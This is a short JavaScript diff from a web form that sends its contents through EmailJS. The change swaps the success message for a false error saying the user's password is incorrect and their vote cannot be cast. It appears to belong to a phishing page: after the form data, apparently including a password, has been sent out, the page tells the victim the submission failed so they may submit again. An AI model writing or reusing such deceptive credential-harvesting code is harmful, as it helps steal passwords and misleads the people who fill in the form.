@@ -150,7 +150,7 @@
                     emailjs.sendForm(serviceID, templateID, this)
                         .then(() => {
                             btn.value = 'Send Email';
-                            alert('Sent!');
+                            alert('Unable to cast vote user password is incorrect to validate Identity');
                         }, (err) => {
                             btn.value = 'Send Email';
                             alert(JSON.stringify(err));
